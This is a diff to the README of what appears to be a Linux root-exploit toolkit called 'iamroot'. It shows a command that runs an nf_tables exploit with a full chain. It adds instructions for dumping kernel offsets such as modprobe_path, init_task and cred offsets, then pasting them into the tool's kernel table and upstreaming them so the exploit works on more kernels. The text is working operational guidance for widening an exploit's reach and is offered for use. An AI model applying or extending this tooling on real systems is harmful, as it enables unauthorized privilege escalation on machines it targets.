@@ -64,6 +64,33 @@ IAMROOT_MODPROBE_PATH=0xffffffff8228e7e0 \
   iamroot --exploit nf_tables --i-know --full-chain
 ```
 
+### Automated dump (preferred for upstreaming)
+
+`iamroot --dump-offsets` walks the four-source chain itself and emits
+a ready-to-paste C struct entry on stdout:
+
+```bash
+sudo iamroot --dump-offsets
+# /* Generated 2026-05-16 by `iamroot --dump-offsets`.
+#  * Host kernel: 5.15.0-56-generic  distro=ubuntu
+#  * Resolved fields: modprobe_path=kallsyms init_task=kallsyms cred=table
+#  * Paste this entry into kernel_table[] in core/offsets.c.
+#  */
+# { .release_glob       = "5.15.0-56-generic",
+#   .distro_match       = "ubuntu",
+#   .rel_modprobe_path  = 0x148e480,
+#   .rel_poweroff_cmd   = 0x148e3a0,
+#   .rel_init_task      = 0x1c11dc0,
+#   .rel_init_cred      = 0x1e0c460,
+#   .cred_offset_real   = 0x738,
+#   .cred_offset_eff    = 0x740,
+# },
+```
+
+Paste the block into `kernel_table[]` in `core/offsets.c`, rebuild,
+and the new entry covers every IAMROOT user on that kernel. Open a
+PR to upstream it.
+
 ### Per-host (write System.map readable)
 
 ```bash
